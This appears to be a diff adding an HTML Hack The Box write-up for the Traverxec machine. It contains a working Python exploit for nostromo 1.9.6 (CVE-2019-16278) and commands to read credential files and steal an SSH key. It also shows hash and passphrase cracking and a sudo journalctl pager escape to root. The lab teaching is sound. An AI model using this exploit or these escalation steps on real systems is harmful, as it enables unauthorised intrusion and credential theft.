@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Traverxec — Full Walkthrough</title>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--red:#f87171;--amber:#fbbf24;--blue:#60a5fa;--purple:#c084fc;--cyan:#22d3ee;--code-bg:#0a0c10}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.7;-webkit-font-smoothing:antialiased}.hero{border-bottom:1px solid var(--border);padding:4rem 2rem 3rem;position:relative}.hero::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--blue),var(--red))}.hero-inner{max-width:860px;margin:0 auto}.hero-label{font-family:'IBM Plex Mono',monospace;font-size:.75rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1rem}.hero h1{font-size:2.8rem;font-weight:700;color:var(--heading);letter-spacing:-.03em}.hero h1 span{color:var(--accent)}.hero-meta{margin-top:1.2rem;display:flex;gap:2rem;flex-wrap:wrap;font-family:'IBM Plex Mono',monospace;font-size:.8rem;color:var(--text-muted)}.hero-meta strong{color:var(--text)}.chain{background:var(--surface);border-bottom:1px solid var(--border);padding:1.5rem 2rem;overflow-x:auto}.chain-inner{max-width:860px;margin:0 auto;display:flex;align-items:center;gap:0;white-space:nowrap;font-family:'IBM Plex Mono',monospace;font-size:.78rem}.chain-node{padding:.4rem .9rem;border-radius:4px;font-weight:500}.chain-node.green{background:var(--accent-dim);color:var(--accent)}.chain-node.blue{background:#1e3a5f;color:var(--blue)}.chain-node.red{background:#5f1e1e;color:var(--red)}.chain-arrow{color:var(--text-muted);padding:0 .5rem}.content{max-width:860px;margin:0 auto;padding:3rem 2rem 6rem}.phase{margin-top:3.5rem;margin-bottom:2rem;padding-bottom:.8rem;border-bottom:1px solid var(--border)}.phase:first-child{margin-top:0}.phase-number{font-family:'IBM Plex Mono',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.3rem}.phase-number.green{color:var(--accent)}.phase-number.blue{color:var(--blue)}.phase-number.red{color:var(--red)}.phase h2{font-size:1.6rem;font-weight:700;color:var(--heading)}h3{font-size:1.15rem;font-weight:600;color:var(--heading);margin-top:2.2rem;margin-bottom:.8rem}p{margin-bottom:1rem}pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;margin:1rem 0 1.4rem;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:1.65;color:var(--text)}pre .comment{color:var(--text-muted)}pre .cmd{color:var(--accent)}pre .output{color:#8b949e}pre .highlight{color:var(--amber)}pre .important{color:var(--red)}code{font-family:'IBM Plex Mono',monospace;font-size:.88em;background:var(--surface-raised);padding:.15em .4em;border-radius:3px;color:var(--cyan)}pre code{background:none;padding:0;color:inherit}.callout{border-radius:6px;padding:1rem 1.2rem;margin:1.2rem 0;font-size:.92rem;line-height:1.6}.callout-why{background:#1a1e26;border-left:3px solid var(--blue)}.callout-why .callout-label{color:var(--blue)}.callout-key{background:#1a1220;border-left:3px solid var(--purple)}.callout-key .callout-label{color:var(--purple)}.callout-warn{background:#1e1a12;border-left:3px solid var(--amber)}.callout-warn .callout-label{color:var(--amber)}.callout-label{font-family:'IBM Plex Mono',monospace;font-size:.72rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;display:block;margin-bottom:.3rem}.takeaway{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin:2rem 0}.takeaway h3{margin-top:0}.takeaway-item{padding:.5rem 0;border-bottom:1px solid var(--border)}.takeaway-item:last-child{border-bottom:none}.takeaway-item strong{color:var(--heading)}.takeaway-item p{margin-bottom:0}.diagram{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:2rem;margin:1.5rem 0;text-align:center;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:2;color:var(--text);overflow-x:auto}.diagram .node{display:inline-block;padding:.3rem .8rem;border-radius:4px}.diagram .node-green{background:var(--accent-dim);color:var(--accent)}.diagram .node-blue{background:#1e3a5f;color:var(--blue)}.diagram .node-red{background:#5f1e1e;color:var(--red)}.diagram .arrow{color:var(--text-muted);margin:0 .3rem}.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:.75rem;color:var(--text-muted);border-top:1px solid var(--border);margin-top:4rem}@media(max-width:640px){.hero h1{font-size:1.8rem}.content{padding:2rem 1rem 4rem}pre{font-size:.75rem;padding:1rem}}</style>
+</head>
+<body>
+<div id="gate" style="position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;"><div style="text-align:center;font-family:'IBM Plex Mono',monospace;"><div style="font-size:2.4rem;margin-bottom:.3rem;">🗺️</div><div style="font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1.2rem;">HTB Writeup — Restricted</div><div style="color:var(--text-muted);font-size:.85rem;margin-bottom:1.5rem;max-width:320px;line-height:1.6;">This writeup contains spoilers for an HTB machine.<br>Enter the password to continue.</div><input id="gate-pw" type="password" placeholder="Password" autofocus style="background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:.6rem 1rem;border-radius:4px;font-family:inherit;font-size:.9rem;width:220px;text-align:center;outline:none;" onkeydown="if(event.key==='Enter')checkPw()"><br><button onclick="checkPw()" style="margin-top:.8rem;background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent);padding:.5rem 1.8rem;border-radius:4px;font-family:inherit;font-size:.82rem;cursor:pointer;">Enter</button><div id="gate-err" style="color:var(--red);font-size:.78rem;margin-top:.8rem;visibility:hidden;">Incorrect password</div><div style="color:var(--text-muted);font-size:.7rem;margin-top:2rem;opacity:.4;font-style:italic;direction:rtl;unicode-bidi:bidi-override;">Tessera est nomen machinae</div></div></div>
+<script>function checkPw(){if(document.getElementById('gate-pw').value==='traverxec'){document.getElementById('gate').style.display='none';sessionStorage.setItem('htb-auth-tv','1')}else{document.getElementById('gate-err').style.visibility='visible';document.getElementById('gate-pw').value=''}}if(sessionStorage.getItem('htb-auth-tv')==='1')document.getElementById('gate').style.display='none';</script>
+
+<header class="hero"><div class="hero-inner"><div class="hero-label">Hack The Box — Walkthrough</div><h1><span>Traverxec</span></h1><div class="hero-meta"><span>OS <strong>Linux</strong></span><span>Difficulty <strong>Easy</strong></span><span>Ports <strong>22 · 80</strong></span><span>Author <strong><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a></strong></span></div></div></header>
+
+<div class="chain"><div class="chain-inner"><span class="chain-node green">nostromo CVE-2019-16278 → www-data</span><span class="chain-arrow">→</span><span class="chain-node blue">homedirs SSH key backup → david</span><span class="chain-arrow">→</span><span class="chain-node red">sudo journalctl → less → !/bin/bash → root</span></div></div>
+
+<main class="content">
+
+<div class="phase"><div class="phase-number green">Phase 0</div><h2>Reconnaissance</h2></div>
+
+<h3>Nmap</h3>
+<pre><code><span class="cmd">$ sudo nmap -sCV -p- -T4 10.129.46.207</span>
+<span class="output">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian
+80/tcp open  http    <span class="highlight">nostromo 1.9.6</span></span></code></pre>
+
+<p><strong>nostromo</strong> is a lightweight web server — uncommon, poorly maintained, and therefore likely vulnerable. A quick searchsploit confirms:</p>
+
+<pre><code><span class="cmd">$ searchsploit nostromo 1.9.6</span>
+<span class="output">nostromo 1.9.6 - Remote Code Execution | multiple/remote/47837.py</span></code></pre>
+
+
+<div class="phase"><div class="phase-number green">Phase 1</div><h2>Initial Access — nostromo Path Traversal RCE (CVE-2019-16278)</h2></div>
+
+<div class="callout callout-why">
+<span class="callout-label">CVE-2019-16278 — how %0d bypasses the path check</span>
+nostromo validates URL paths to prevent directory traversal. But the <code>%0d</code> character (carriage return) confuses the validator — it sees the path as safe, but the request handler interprets <code>/.%0d./</code> as <code>/../</code>. This lets the attacker traverse out of the document root and reach <code>/bin/sh</code>, executing arbitrary commands. Think of it as a newline character tricking the bouncer into looking the other way.
+</div>
+
+<h3>Python3 Exploit</h3>
+<pre><code>#!/usr/bin/env python3
+"""CVE-2019-16278 — nostromo 1.9.6 RCE"""
+import sys, socket
+
+def cve(target, port, cmd):
+    soc = socket.socket()
+    soc.connect((target, int(port)))
+    payload = (
+        'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\n'
+        'Content-Length: 1\r\n\r\n'
+        'echo\necho\n{} 2>&1'.format(cmd)
+    )
+    soc.send(payload.encode())
+    response = b""
+    try:
+        while True:
+            chunk = soc.recv(1024)
+            if not chunk: break
+            response += chunk
+    except: pass
+    print(response.decode('utf-8', errors='ignore'))
+
+if __name__ == "__main__":
+    cve(sys.argv[1], sys.argv[2], sys.argv[3])</code></pre>
+
+<pre><code><span class="cmd">$ python3 exploit.py 10.129.46.207 80 "whoami"</span>
+<span class="output">www-data</span></code></pre>
+
+
+<div class="phase"><div class="phase-number blue">Phase 2</div><h2>Lateral Movement — nostromo Config → homedirs → SSH Key</h2></div>
+
+<h3>Read nostromo Configuration</h3>
+<pre><code><span class="cmd">$ python3 exploit.py 10.129.46.207 80 "cat /var/nostromo/conf/nhttpd.conf"</span>
+<span class="output">servername      traverxec.htb
+docroot         /var/nostromo/htdocs
+htpasswd        <span class="highlight">/var/nostromo/conf/.htpasswd</span>
+homedirs        /home
+homedirs_public <span class="highlight">public_www</span></span></code></pre>
+
+<div class="callout callout-key">
+<span class="callout-label">nostromo homedirs explained</span>
+When <code>homedirs</code> is enabled, nostromo serves each user's <code>public_www</code> directory via <code>/~username/</code>. Even though <code>/home/david</code> is locked (no read permission for www-data), the <code>public_www</code> subdirectory is explicitly exposed by the web server config. It's like the room door is locked, but there's a public display case right outside it.
+</div>
+
+<h3>Crack htpasswd Hash</h3>
+<pre><code><span class="cmd">$ python3 exploit.py 10.129.46.207 80 "cat /var/nostromo/conf/.htpasswd"</span>
+<span class="output">david:<span class="highlight">$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/</span></span>
+
+<span class="comment"># $1$ = MD5-crypt → hashcat mode 500</span>
+<span class="cmd">$ hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt</span>
+<span class="output"><span class="highlight">Nowonly4me</span></span></code></pre>
+
+<h3>Extract SSH Key from public_www</h3>
+<pre><code><span class="cmd">$ python3 exploit.py 10.129.46.207 80 \
+    "ls /home/david/public_www/protected-file-area/"</span>
+<span class="output"><span class="highlight">backup-ssh-identity-files.tgz</span></span>
+
+<span class="comment"># Extract the archive on the target</span>
+<span class="cmd">$ python3 exploit.py 10.129.46.207 80 \
+    "cp /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz /tmp/x.tgz"
+$ python3 exploit.py 10.129.46.207 80 "cd /tmp && gunzip x.tgz && tar xf x.tar"
+$ python3 exploit.py 10.129.46.207 80 "cat /tmp/home/david/.ssh/id_rsa"</span></code></pre>
+
+<h3>Crack SSH Key Passphrase</h3>
+<pre><code><span class="cmd">$ ssh2john id_rsa > hash.txt
+$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</span>
+<span class="output"><span class="highlight">hunter</span></span></code></pre>
+
+<div class="callout callout-warn">
+<span class="callout-label">rockyou.txt.gz gotcha</span>
+Using <code>rockyou.txt.gz</code> directly with john may return 0 results due to UTF-16 BOM issues. Always <code>gunzip</code> it first and use the uncompressed <code>.txt</code> file.
+</div>
+
+<pre><code><span class="cmd">$ chmod 600 id_rsa
+$ ssh -i id_rsa david@10.129.46.207</span>
+<span class="output">Passphrase: hunter</span>
+
+<span class="cmd">david@traverxec:~$ cat user.txt</span>
+<span class="output">f289c5fd1716c07bd729f90e474d011e</span></code></pre>
+
+
+<div class="phase"><div class="phase-number red">Phase 3</div><h2>Privilege Escalation — sudo journalctl → less Pager Escape</h2></div>
+
+<h3>Discovery</h3>
+<pre><code><span class="cmd">david@traverxec:~/bin$ cat server-stats.sh</span>
+<span class="output">#!/bin/bash
+cat /home/david/bin/server-stats.head
+echo "Load: `/usr/bin/uptime`"
+echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
+echo "Last 5 journal log lines:"
+<span class="highlight">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</span> | /usr/bin/cat</span></code></pre>
+
+<p>david can run <code>sudo journalctl</code> without a password. The script pipes to <code>cat</code> to avoid the pager, but we can run the command directly without the pipe.</p>
+
+<div class="callout callout-key">
+<span class="callout-label">Pager escape — how less gives root</span>
+When <code>journalctl</code> output is taller than the terminal, it spawns <code>less</code> as a pager. Since <code>journalctl</code> runs as root via sudo, <code>less</code> also runs as root. Inside less, typing <code>!</code> opens a command prompt — and <code>!/bin/bash</code> spawns a root shell. The trick: <strong>shrink the terminal window</strong> to 3-4 lines so the output can't fit on one screen, forcing the pager to activate.
+</div>
+
+<h3>Exploitation</h3>
+<pre><code><span class="comment"># Step 1: Shrink terminal window to 3-4 lines tall</span>
+<span class="comment"># Step 2: Run journalctl (without the | cat pipe)</span>
+<span class="cmd">david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</span>
+
+<span class="comment"># Step 3: less activates (shows : prompt at bottom)</span>
+<span class="comment"># Step 4: Type !/bin/bash and press Enter</span>
+<span class="cmd">!/bin/bash</span>
+
+<span class="output">root@traverxec:~# cat /root/root.txt
+ea40fe180b85773a15922bb003fbc02a</span></code></pre>
+
+
+<div class="phase"><div class="phase-number" style="color:var(--purple);">Appendix</div><h2>Key Takeaways</h2></div>
+
+<div class="takeaway">
+<div class="takeaway-item"><strong>Obscure web servers = easy CVEs.</strong><p>nostromo is rarely used and rarely patched. CVE-2019-16278 is a trivial pre-auth RCE using <code>%0d</code> path traversal. Always searchsploit the exact version.</p></div>
+<div class="takeaway-item"><strong>Web server configs reveal hidden directories.</strong><p>nostromo's <code>homedirs_public</code> exposed <code>public_www</code> even though the parent <code>/home/david</code> was locked. Always read the web server config after getting a shell.</p></div>
+<div class="takeaway-item"><strong>Backup archives in public directories are treasure.</strong><p><code>backup-ssh-identity-files.tgz</code> in <code>public_www</code> contained david's encrypted SSH key. Weak passphrase (<code>hunter</code>) fell to john instantly.</p></div>
+<div class="takeaway-item"><strong>Any sudo command that invokes a pager can escalate.</strong><p><code>journalctl</code>, <code>man</code>, <code>git log</code>, <code>systemctl status</code> — all use <code>less</code> as default pager. If you can sudo any of these, shrink the terminal and type <code>!/bin/bash</code> for root. Check GTFOBins for the full list.</p></div>
+<div class="takeaway-item"><strong>Terminal size is a tool, not just a preference.</strong><p>A small terminal forces pager activation. Some escalation techniques only work when the output overflows the screen — always try resizing if a pager-based attack doesn't trigger.</p></div>
+</div>
+
+<div class="diagram"><span class="node node-green">nostromo RCE</span><span class="arrow">→</span><span class="node node-green">www-data</span><span class="arrow">→</span><span class="node node-blue">homedirs → SSH key → david</span><span class="arrow">→</span><span class="node node-red">journalctl → less → root</span></div>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB Traverxec Writeup · 2026</footer>
+</body></html>
